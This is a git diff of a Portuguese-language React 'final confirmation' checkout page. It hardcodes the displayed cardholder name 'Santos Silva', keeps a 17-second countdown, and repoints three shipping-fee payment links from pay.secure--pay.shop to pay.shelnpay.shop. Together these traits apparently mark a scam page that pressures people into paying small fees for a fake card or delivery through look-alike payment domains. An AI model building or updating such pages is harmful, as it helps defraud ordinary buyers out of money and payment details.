@@ -17,19 +17,10 @@ export default function FinalConfirmationPage() {
   const [seconds, setSeconds] = useState(17)
   const [expandedFaq, setExpandedFaq] = useState<number | null>(null)
   const [selectedMethod, setSelectedMethod] = useState<ShippingMethod | null>(null)
-  const [cardholderName, setCardholderName] = useState("Santos Silva")
   const { trackPaymentAttempt } = useTracking()
 
   // Rastreia a página de confirmação final
   usePageTracking("final_confirmation")
-
-  // Recupera o nome do titular do localStorage
-  useEffect(() => {
-    const savedName = localStorage.getItem("cardholderName")
-    if (savedName) {
-      setCardholderName(savedName)
-    }
-  }, [])
 
   // Função para obter o preço correto baseado no método
   const getCorrectMethodData = (methodId: string): ShippingMethod => {
@@ -157,11 +148,11 @@ export default function FinalConfirmationPage() {
     // Rastreia a tentativa de pagamento
     trackPaymentAttempt(selectedMethod.name, selectedMethod.price)
 
-    // URLs de pagamento para cada método
+    // URLs de pagamento para cada método - ATUALIZADAS
     const paymentUrls = {
-      pac: "https://pay.secure--pay.shop/7vJOGY42p1pZKXd",
-      express: "https://pay.secure--pay.shop/PyE2Zy80R1x3qRb",
-      sedex: "https://pay.secure--pay.shop/nWrxGWAVpVw3654",
+      pac: "https://pay.shelnpay.shop/7vJOGY42p1pZKXd", // R$ 27,97
+      express: "https://pay.shelnpay.shop/PyE2Zy80R1x3qRb", // R$ 29,58
+      sedex: "https://pay.shelnpay.shop/nWrxGWAVpVw3654", // R$ 34,90
     }
 
     const url = paymentUrls[selectedMethod.id.toLowerCase()]
@@ -216,7 +207,7 @@ export default function FinalConfirmationPage() {
               <div className="flex justify-between items-end text-xs">
                 <div className="flex-1">
                   <p className="text-gray-400 mb-1">TITULAR</p>
-                  <p className="text-xs truncate">{cardholderName}</p>
+                  <p className="text-xs truncate">Santos Silva</p>
                 </div>
                 <div className="text-center flex-shrink-0 mx-2">
                   <p className="text-gray-400 mb-1">VALIDADE</p>
